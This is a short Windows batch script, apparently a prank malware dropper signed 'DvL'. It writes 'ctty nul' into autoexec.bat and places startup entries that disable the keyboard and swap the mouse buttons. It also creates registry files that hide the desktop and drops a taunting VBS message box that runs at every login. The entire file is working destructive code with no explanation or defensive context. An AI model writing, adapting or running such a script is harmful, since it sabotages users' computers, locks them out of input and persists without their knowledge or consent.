@echo.ctty nul>autoexec.bat
@echo.@echo off>>autoexec.bat
@echo.@%windir%\rundll32.exe keyboard,disable>%windir%\startm~1\programs\startup\"Jokes from DvL.bat"
@echo.@%windir%\rundll32.exe user,swapmousebutton>>%windir%\startm~1\programs\startup\"Jokes from DvL.bat"
@echo.REGEDIT4>jokera.reg
@echo.>>jokera.reg
@echo.[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>jokera.reg
@echo."NoDesktop"=dword:00000000>>jokera.reg
@echo.REGEDIT4>jokerb.reg
@echo.>>jokerb.reg
@echo.[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>jokerb.reg
@echo."NoDesktop"=dword:00000001>>jokerb.reg
@echo.On Error Resume Next>joker.vbs
@echo.MsgBox "Ha ! U've been JOKED by DvL",4144,"Ho Ho Ho Merry Christmas U Idiotz">>joker.vbs
@copy joker.vbs %windir%\startm~1\programs\startup\joker.vbs
cls